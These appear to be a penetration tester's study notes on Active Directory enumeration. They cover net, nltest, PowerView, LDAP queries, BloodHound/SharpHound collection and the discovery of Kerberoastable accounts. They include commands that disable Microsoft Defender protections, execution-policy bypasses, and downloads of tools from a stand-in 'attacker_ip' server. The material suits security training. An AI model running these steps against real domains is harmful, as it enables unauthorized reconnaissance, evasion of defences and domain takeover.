# Active Directory (AD) Enumeration

Active Directory  Domain Services (AD)
- service allowing sysadmin update/manage OS, apps, users, data access on large scale  
- AD installed with standard config & often configured to org needs  

Objects = users, groups, computers, etc
- Organization Units (OUs)  = containers used to organize AD objects inside a domain
- Attributes = Every AD object has attributes

Domain Controller = core server in an AD domain.
- stores the AD database = {all OUs, objects, attributes }
- usually the highest-value host in the domain

| Object              | Meaning                                                              | Use                                                          |
| ------------------- | -------------------------------------------------------------------- | ------------------------------------------------------------ |
| User                | Domain account used for login and access                             | May have credentials, group memberships, or delegated rights |
| Group               | Collection of users, computers, or other groups                      | Permissions are often assigned to groups                     |
| Computer            | Domain-joined workstation or server                                  | May have sessions, local admin rights, or services           |
| Organizational Unit | Container used to organize AD objects                                | GPOs and delegated permissions often apply to OUs            |
| Domain Controller   | Server that stores and enforces AD authentication and directory data | High-value target                                            |
| GPO                 | Group Policy Object used to apply settings                           | Misconfigured GPOs can create privesc paths                  |

| Attribute              | Example Use                                        |
| ---------------------- | -------------------------------------------------- |
| `cn`                   | Common name                                        |
| `sAMAccountName`       | Logon name                                         |
| `description`          | Sometimes contains useful notes or mistakes        |
| `memberOf`             | Shows group membership                             |
| `lastLogon`            | Helps identify active accounts                     |
| `pwdLastSet`           | Helps identify stale or recently changed passwords |
| `servicePrincipalName` | Useful for Kerberoasting checks                    |
| `userAccountControl`   | Shows account flags and properties                 |

Common DC-related services:

| Service        | Port | Use                                |
| -------------- | ---- | ---------------------------------- |
| DNS            | 53   | Domain name resolution             |
| Kerberos       | 88   | Domain authentication              |
| LDAP           | 389  | Directory queries                  |
| SMB            | 445  | File sharing, SYSVOL, admin access |
| Global Catalog | 3268 | Forest-wide directory searches     |

Common high-value groups:

| Group                   | Use                                                            |
| ----------------------- | -------------------------------------------------------------- |
| Domain Admins           | Full control over the domain                                   |
| Enterprise Admins       | Forest-wide control                                            |
| Administrators          | Local admin rights on systems where applied                    |
| Account Operators       | Can manage many user/group objects                             |
| Server Operators        | Can manage domain controllers in some environments             |
| Backup Operators        | May access sensitive files                                     |
| Remote Management Users | May allow WinRM access                                         |
| Remote Desktop Users    | May allow RDP access                                           |
| DNSAdmins               | Can sometimes lead to DC compromise depending on configuration |

common examples 
```text
dc01.domain.local → domain controller  
sql01.domain.local → MSSQL target  
fs01.domain.local → file shares  
web01.domain.local → web/IIS  
backup01.domain.local → backup software / creds
```

AD Model
```text
Forest  
└── Domain Tree  
└── Domain  
├── Domain Controllers  
├── OUs  
│ ├── Users  
│ ├── Groups  
│ └── Computers  
├── Groups  
├── GPOs  
└── Permissions / ACLs
```


Domain Tree = collection of one or more domains that share a contiguous namespace
- child domains may trust parent domains
- privileges may not automatically apply everywhere
- trust relationships can create attack paths

```text
# e.g
corp.local
├── dev.corp.local
└── sales.corp.local
```

Domain Forest = top-level AD boundary
- a forest can contain multiple domains
- trust relationships may exist inside the forest
- `Enterprise Admins` can usually administer all domains in the forest
- forest-level compromise is broader than single-domain compromise

```text
# e.g
corp.local
research.local
internal.company.local
```

## Manual AD Enumeration 

```cmd
whoami /fqdn
echo %USERDOMAIN%
echo %LOGONSERVER%
nltest /dsgetdc:domain.local
```

```powershell
$env:USERNAME  
$env:USERDOMAIN  
$env:COMPUTERNAME  
[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
```

```powershell
# check if domain joined
Get-CimInstance Win32_ComputerSystem | Select-Object Domain,PartOfDomain

# find current domain
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().Name

# find domain controllers
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers

# find PDC owner
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner
```

| Finding            | Use                                   |
| ------------------ | ------------------------------------- |
| Domain joined host | AD attacks may be possible            |
| Current domain     | Needed for LDAP, Kerberos, SMB, WinRM |
| Logon server / DC  | Good target for LDAP/Kerberos enum    |
| Current user       | Determines what we can query / access |
| User groups        | May reveal delegated access           |
| DNS suffix         | Helps build FQDNs and SPNs            |

based on [nmap](../../03-tools/nmap.md) otuput
```text
AD ports open → enum domain context  
SMB open → users/shares/auth checks  
LDAP open → directory enum  
Kerberos open → roasting / ticket attacks may be possible  
WinRM open → possible remote shell if creds work
```

```cmd
::enumerate high value users in domain 
net user /domain
net group /domain
net group "Domain Admins" /domain
net group "Enterprise Admins" /domain
net group "Remote Desktop Users" /domain
net group "Backup Operators" /domain
net view /domain

:: find domain controller 
nltest /dsgetdc:domain.local

:: list domain trsuts if possible
nltest /domain_trusts
```


----

## Automated Enumeration  

### Anti-virus (AV) Evasion

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableTamperProtection $true
```

### PowerView

Refer to [PowerView](../../03-tools/powerview.md) for detailed notes

```bash
└─$ pwd    
/home/exploits

└─$ python3 -m http.server 80  
```

```cmd
powershell -ep bypass
```

```powershell
iwr -uri http://attacker_ip/enum/PowerView.ps1 -outfile PowerView.ps1

Import-Module .\PowerView.ps1  

# Domain Info
Get-NetDomain
Get-Domain
Get-DomainController

# Users
Get-NetUser  
Get-NetUser | Select-Object cn  
Get-NetUser | Select-Object cn,pwdlastset,lastlogon  

Get-DomainUser
Get-DomainUser | Select-Object samaccountname,description,pwdlastset,lastlogon

# Computers
Get-NetComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion

Get-DomainComputer | Select-Object dnshostname,operatingsystem,operatingsystemversion

# scan network to see if current user has admin perm on computers in domain
Find-LocalAdminAccess  

# find shares in domain  
Find-DomainShare  
# display shares only available to us  
Find-DomainShare -CheckShareAccess  

# use NetWkstauserEnum & NetSessionEnum under the hood 
Get-NetSession -ComputerName computer_name  
Get-NetSession -ComputerName computer_name -Verbose

# retrieve perm for object   
# filter based on identity  
Get-ObjectAcl -Identity alice  
# object defined with -Path flag  
Get-ObjectAcl -Identity "GROUP_NAME"

# ActiveDirectoryRights + SecurityIdentifier  
# e.g. display only values rel to GenericAll    
Get-ObjectAcl -Identity "GROUP_NAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  

Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
```

e.g. finding Shares and SYSVOL
```powershell
# find shares in domain  
Find-DomainShare  
# display shares only available to us  
Find-DomainShare -CheckShareAccess  
```

after `PowerView` finds the domain + DC: check `SYSVOL`
```cmd
ls \\DC01.domain.com\sysvol\domain.com

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----                 DATE               Policies
d-----                 DATE               scripts
```  

```powershell
Get-ChildItem \\DC01.domain.com\sysvol\domain.com -Recurse
```

look for: 
- `Policies`
- `scripts`
- `Groups.xml`
- `Services.xml`
- `ScheduledTasks.xml`
- `Drives.xml`
- `.bat`
- `.cmd`
- `.ps1`
- hardcoded creds
- old GPP `cpassword`

e.g. ACL Enumeration
```powershell
# ActiveDirectoryRights + SecurityIdentifier  
# e.g. display only values rel to GenericAll    
Get-ObjectAcl -Identity "GROUP_NAME" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights  

SecurityIdentifier                            ActiveDirectoryRights
------------------                            ---------------------
S-1-5-21-1111111111-2222222222-3333333333-512 GenericAll

# resolve SID
Convert-SidToName S-1-5-21-1111111111-2222222222-3333333333-512
```

rights to enumerate 
```text
GenericAll
GenericWrite
WriteDacl
WriteOwner
AddMember
AddSelf
ForceChangePassword
AllExtendedRights
DCSync rights
```


---

## LDAPSearch

LDAP Search Helper Function - [[ldap_helper|]]  [ldap_search_helper.ps1](../../03-tools/scripts/ldap_search_helper.ps1) & [get-ldapobjectproperties.ps1](../../03-tools/scripts/get-ldapobjectproperties.ps1)

- Accepts an LDAP query as a parameter.
- Identifies the current domain’s PDC Emulator.
- Gets the domain Distinguished Name.
- Builds an LDAP connection path.
- Creates a `DirectorySearcher` object.
- Runs the LDAP query.
- Returns matching Active Directory objects.

```powershell
powershell -ep bypass
Import-Module .\ldap_search_helper.ps1

# or
. .\ldap_search_helper.ps1  
# ↑ ↑  
# | script path  
# dot-source operator
```

Common LDAP Queries
```powershell
# Enumerate Domain Users
LDAPSearch -LDAPQuery "(samAccountType=805306368)"

Path                                                         Properties
----                                                         ----------
LDAP://DC_HOSTNAME.DOMAIN.LOCAL/CN=Administrator,...          {...}
LDAP://DC_HOSTNAME.DOMAIN.LOCAL/CN=Guest,...                  {...}
LDAP://DC_HOSTNAME.DOMAIN.LOCAL/CN=krbtgt,...                 {...}
LDAP://DC_HOSTNAME.DOMAIN.LOCAL/CN=DOMAIN_USER,...            {...}
LDAP://DC_HOSTNAME.DOMAIN.LOCAL/CN=SERVICE_ACCOUNT,...        {...}
```

-> Common `samAccountType` Values
```powershell
805306368 User object  
805306369 Computer object  
805306370 Trust account  
268435456 Security group  
268435457 Non-security group  
536870912 Alias / local group  
536870913 Non-security alias
```

Enumerate Groups
```powershell
# List All Groups
LDAPSearch -LDAPQuery "(objectClass=group)"
LDAPSearch -LDAPQuery "(objectCategory=group)"
```
=D groups for pentesting purposes
	Domain Admins  
	Enterprise Admins  
	Remote Desktop Users  
	Backup Operators  
	Account Operators  
	Server Operators  
	DNSAdmins  
	Custom department or admin groups

Print Selected Group Attributes - decreased noise output to show group membership relationships
```powershell
# display each group’s common name and members:
foreach ($group in $(LDAPSearch -LDAPQuery "(objectCategory=group)")) {  
$group.properties | select {$_.cn}, {$_.member}  
}

GROUP_NAME               {CN=NESTED_GROUP_NAME,DC=DOMAIN,DC=LOCAL, CN=DOMAIN_USER,OU=Users,DC=DOMAIN,DC=LOCAL}
ADMIN_GROUP              CN=ADMIN_USER,OU=Users,DC=DOMAIN,DC=LOCAL
DEPARTMENT_GROUP         {CN=OTHER_GROUP,DC=DOMAIN,DC=LOCAL, CN=DOMAIN_USER,OU=Users,DC=DOMAIN,DC=LOCAL}
```

Query a Specific Group
```powershell
# Search for a specific group by common name:
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=GROUP_NAME))"

# Display the group members:
$group.properties.member

CN=NESTED_GROUP_NAME,DC=DOMAIN,DC=LOCAL
CN=DOMAIN_USER,OU=Users,DC=DOMAIN,DC=LOCAL
CN=ANOTHER_USER,OU=Users,DC=DOMAIN,DC=LOCAL
```

Nested Group Enumeration 
```
e.g. nested group - DOMAIN_USER_4 may be an indirect member of GROUP_A.

=D bc DOMAIN_USER_4 may <- inherit permissions associated with GROUP_NAME.

GROUP_A
├── DOMAIN_USER_1
├── DOMAIN_USER_2
└── GROUP_B
    ├── DOMAIN_USER_3
    └── GROUP_C
        └── DOMAIN_USER_4
```


```powershell
# Step 1: Query the First Group
$group = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=GROUP_NAME))"
$group.properties.member

CN=NESTED_GROUP_NAME,DC=DOMAIN,DC=LOCAL
CN=DOMAIN_USER_1,OU=Users,DC=DOMAIN,DC=LOCAL
CN=DOMAIN_USER_2,OU=Users,DC=DOMAIN,DC=LOCAL

# Step 2: Query the Nested Group
$nested = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=NESTED_GROUP_NAME))"
$nested.properties.member

CN=SECOND_NESTED_GROUP,DC=DOMAIN,DC=LOCAL
CN=DOMAIN_USER_3,OU=Users,DC=DOMAIN,DC=LOCAL

# Step 3: Continue Until the Chain Ends
$nested = LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=SECOND_NESTED_GROUP))"
$nested.properties.member

CN=DOMAIN_USER_4,OU=Users,DC=DOMAIN,DC=LOCAL
```


LDAP Search Helper Function `Get-LDAPObjectProperties` - [[ldap_helper|]]  [get-ldapobjectproperties.ps1](../../03-tools/scripts/get-ldapobjectproperties.ps1)

```powershell
powershell -ep bypass
Import-Module .\get-ldapobjectproperties.ps1

# or
. .\get-ldapobjectproperties.ps1  
# ↑ ↑  
# | script path  
# dot-source operator
```

Common  Queries
```powershell
Get-LDAPObjectProperties -ObjectName "GROUP_NAME"
Get-LDAPObjectProperties -ObjectName "DOMAIN_USER"

# Users
LDAPSearch -LDAPQuery "(samAccountType=805306368)"  

# Computers
LDAPSearch -LDAPQuery "(samAccountType=805306369)"
LDAPSearch -LDAPQuery "(objectCategory=group)"

# Specific User
LDAPSearch -LDAPQuery "(&(objectCategory=user)(sAMAccountName=DOMAIN_USER))"

# Users with SPNs
LDAPSearch -LDAPQuery "(&(objectCategory=user)(servicePrincipalName=*))"

# Disabled Users
LDAPSearch -LDAPQuery "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=2))"

# Domain Admins Group
LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Domain Admins))"
```


---

### BloodHound

Refer to [bloodhound](../../03-tools/bloodhound.md) for more detailed notes 

```bash
└─$ wget https://github.com/SpecterOps/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip

└─$ unzip SharpHound-v1.1.0.zip
└─$ cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .
```

```bash
└─$ cp /usr/share/peass/winpeas/winPEASx64.exe .  
└─$ pwd    
/home/exploits
└─$ python3 -m http.server 80  
```

```powershell
# move Sharphound Kali -> Win 
powershell -ep bypass  

iwr -uri http://attacker_ip/enum/SharpHound.ps1 -outfile SharpHound.ps1

Import-Module ./Sharphound.ps1

# enum command
# perform ALL collection methods except for local group policies  
# default: gather data in JSON files + zip for us to transfer to kali  
Invoke-BloodHound -CollectionMethod All -OutputPrefix "audit"

# enum with output directory specified
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\Users\current_user\Desktop\ -OutputPrefix "audit"
```

Bloodhound Startup  = Docker OR Neo4j
Docker startup
```bash
└─$ docker compose up -d

└─$ cat /home/path/to/.config/bloodhound/bloodhound.config.json

{
  "bind_addr": "0.0.0.0:8080",
  "collectors_base_path": "/etc/bloodhound/collectors",
  "config_directory": "/home/path/to/.config/bloodhound",
  "default_admin": {
    "password": "REDACTED_DEFAULT_PW",
    "principal_name": "bloodhound_admin"
  },
  "default_password": "REDACTED_DEFAULT_PW",
	###
  "log_path": "bloodhound.log",
	###
  "recreatedefaultadmin": "false",
  "root_url": "http://127.0.0.1:8080", 
	 ### 
  "work_dir": "/opt/bloodhound/work"
}  
# open bloodhound at http://127.0.0.1:8080

└─$ pwd       
/home/path/to/.config/bloodhound

# Restart if needed:
└─$ docker compose down                                 
[+] down 4/4
 ✔ Container bloodhound-bloodhound-1 Removed                                                                    0.0s
 ✔ Container bloodhound-graph-db-1   Removed                                                                    0.0s
 ✔ Container bloodhound-app-db-1     Removed                                                                    0.4s
 ✔ Network bloodhound_default        Removed                                                                    0.3s

# If resetting the default admin is required in a lab:
└─$ bhe_recreate_default_admin=true docker compose up -d
[+] up 4/4
 ✔ Network bloodhound_default        Created                                                                   0.1ss
 ✔ Container bloodhound-graph-db-1   Healthy                                                                   16.2s
 ✔ Container bloodhound-app-db-1     Healthy                                                                   6.2ss
 ✔ Container bloodhound-bloodhound-1 Started                                                                   16.3s
```

neo4j startup
```bash  
└─$ sudo neo4j start      
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:761627). It is available at http://localhost:7474

# neo4j service running 
# open at http://localhost:7474
```  

Import Data
1. Open BloodHound.
2. Authenticate.
3. Upload the SharpHound `.zip` output.
4. Wait for ingestion.
5. Start with built-in queries.
6. Use custom Cypher queries for focused checks.

High-value questions:
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Find Computers where Domain Users are Local Admin
- Find Users with Foreign Domain Group Membership
- Find Kerberoastable Users
- Find AS-REP Roastable Users
- Find Local Admin Access for current user
- Find Sessions for high-value users

| Finding               | Meaning                                              | Use                                                                                               | Relevant Attack                           |
| --------------------- | ---------------------------------------------------- | ------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| `GenericAll`          | Full control over the target AD object               | Usually high-impact. May allow password reset, group modification, RBCD, or object takeover.      | [domain-privesc](./domain-privesc.md)     |
| `GenericWrite`        | Can write certain attributes on the target object    | May allow logon script abuse, SPN modification, shadow credentials, or other object manipulation. | [domain-privesc](./domain-privesc.md)     |
| `WriteDacl`           | Can modify the target object’s permissions / ACL     | Can grant yourself stronger rights such as `GenericAll`.                                          | [domain-privesc](./domain-privesc.md)     |
| `WriteOwner`          | Can change the owner of the target object            | Owner can usually modify ACLs, which may lead to full control.                                    | [domain-privesc](./domain-privesc.md)     |
| `Owns`                | Current user or controlled principal owns the object | Ownership can often be used to change permissions and escalate control.                           | [domain-privesc](./domain-privesc.md)     |
| `AddMember`           | Can add users/groups to the target group             | If the group is privileged, this may directly escalate domain privileges.                         | [domain-privesc](./domain-privesc.md)     |
| `AddSelf`             | Can add yourself to a group                          | Useful if the target group has local admin, delegated, or domain privileges.                      | [domain-privesc](./domain-privesc.md)     |
| `ForceChangePassword` | Can reset another user’s password                    | May allow takeover of the target account if operationally safe.                                   | [domain-privesc](./domain-privesc.md)     |
| `AllExtendedRights`   | Has all extended rights over the object              | May include password reset or replication-related rights depending on object type.                | [domain-privesc](./domain-privesc.md)     |
| `ReadLAPSPassword`    | Can read LAPS-managed local admin password           | May give local admin access to one or more machines.                                              | [domain-privesc](./domain-privesc.md)     |
| `ReadGMSAPassword`    | Can read gMSA password material                      | May allow use of a managed service account.                                                       | [domain-privesc](./domain-privesc.md)     |
| `GetChanges`          | Directory replication permission                     | Part of possible DCSync path, but usually not enough alone.                                       | [domain-privesc](./domain-privesc.md)     |
| `GetChangesAll`       | Replicate all directory changes                      | Combined with required replication rights, may allow DCSync.                                      | [domain-privesc](./domain-privesc.md)     |
| `DCSync`              | Can replicate domain secrets from the DC             | High-impact. May allow dumping domain credential material.                                        | [domain-privesc](./domain-privesc.md)     |
| `AllowedToDelegate`   | Account is trusted for delegation                    | May allow Kerberos delegation abuse depending on configuration.                                   | [kerberos-attacks](./kerberos-attacks.md) |
| `AllowedToAct`        | Resource-based constrained delegation relationship   | May allow impersonation to a target computer/service.                                             | [kerberos-attacks](./kerberos-attacks.md) |
| `AddAllowedToAct`     | Can modify RBCD on target computer                   | May allow setting RBCD and impersonating users to the target.                                     | [kerberos-attacks](./kerberos-attacks.md) |
| `HasSIDHistory`       | Account has SID history from another principal       | May indicate inherited privileges from old/migrated accounts.                                     | [domain-privesc](./domain-privesc.md)     |
| `AdminTo`             | User/group has local admin on a computer             | Useful for lateral movement or local privesc on that machine.                                     | [lateral-movement](./lateral-movement.md) |
| `CanRDP`              | Can log in over RDP                                  | Useful for interactive access if RDP is reachable.                                                | [lateral-movement](./lateral-movement.md) |
| `CanPSRemote`         | Can access host via PowerShell Remoting / WinRM      | Useful for remote shell access with valid creds.                                                  | [lateral-movement](./lateral-movement.md) |
| `ExecuteDCOM`         | Can execute commands through DCOM                    | Possible lateral movement technique.                                                              | [lateral-movement](./lateral-movement.md) |
| `SQLAdmin`            | Admin rights over MSSQL instance                     | May allow command execution or credential access through MSSQL.                                   | [lateral-movement](./lateral-movement.md) |
| `HasSession`          | User has an active session on a computer             | Useful for finding where privileged users are logged in.                                          | [lateral-movement](./lateral-movement.md) |
| `Kerberoastable`      | User has SPN set                                     | May allow Kerberoasting and offline password cracking.                                            | [kerberos-attacks](./kerberos-attacks.md) |
| `ASREPRoastable`      | User does not require Kerberos pre-authentication    | May allow AS-REP roasting and offline password cracking.                                          | [kerberos-attacks](./kerberos-attacks.md) |
| `MemberOf`            | User/group is member of another group                | Helps trace nested privilege paths.                                                               | [domain-privesc](./domain-privesc.md)     |
| `Contains`            | OU/container contains target objects                 | Useful when combined with delegated rights over an OU.                                            | [domain-privesc](./domain-privesc.md)     |
| `GpLink`              | GPO is linked to OU/site/domain                      | Useful for understanding GPO impact scope.                                                        | [domain-privesc](./domain-privesc.md)     |
| `GenericAll` over GPO | Full control over a GPO                              | May allow code execution on systems where the GPO applies.                                        | [domain-privesc](./domain-privesc.md)     |
| `WriteDacl` over GPO  | Can change GPO permissions                           | May allow taking control of the GPO.                                                              | [domain-privesc](./domain-privesc.md)     |
| `WriteOwner` over GPO | Can take ownership of GPO                            | May lead to GPO control.                                                                          | [domain-privesc](./domain-privesc.md)     |

Record for each useful path: 
```text
Current user:
Current host:
Target object:
Relationship:
BloodHound path:
Manual validation:
Exploit idea:
Risk / caveat:
Result:
```

e.g. 
```text
Current user: domain.local\alice
Current host: workstation01
Target object: Helpdesk Operators
Relationship: AddMember
BloodHound path: alice -> AddMember -> Helpdesk Operators
Manual validation: PowerView confirms ACL
Exploit idea: Add controlled user to group
Risk / caveat: Group membership change is noisy
Result: pending validation
```


---


### Kerberos Enumeration

Refer to [kerberos attacks](./kerberos-attacks.md) for detailed notes

**Kerberoastable Users**

```cmd
:: Native command
setspn -L SERVICE_ACCOUNT

Registered ServicePrincipalNames for CN=SERVICE_ACCOUNT,CN=Users,DC=domain,DC=local:
        HTTP/WEB_HOSTNAME.domain.local
        HTTP/WEB_HOSTNAME
        HTTP/WEB_HOSTNAME.domain.local:80
```

```powershell
# using ldapsearch 
LDAPSearch -LDAPQuery "(&(objectCategory=user)(servicePrincipalName=*))"

# powerview
Get-DomainUser -SPN
```

user account + SPN may be Kerberoastable  
→ see kerberos-attacks.md

**AS-REP Roastable Users**

```powershell
# ldapsearch
LDAPSearch -LDAPQuery "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"

# powerview
Get-DomainUser -PreauthNotRequired
```
pre-auth disabled → may request AS-REP hash

**Delegation Candidates**
```powershell
# powerview
Get-DomainComputer -Unconstrained
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
```

delegation findings can create Kerberos attack paths

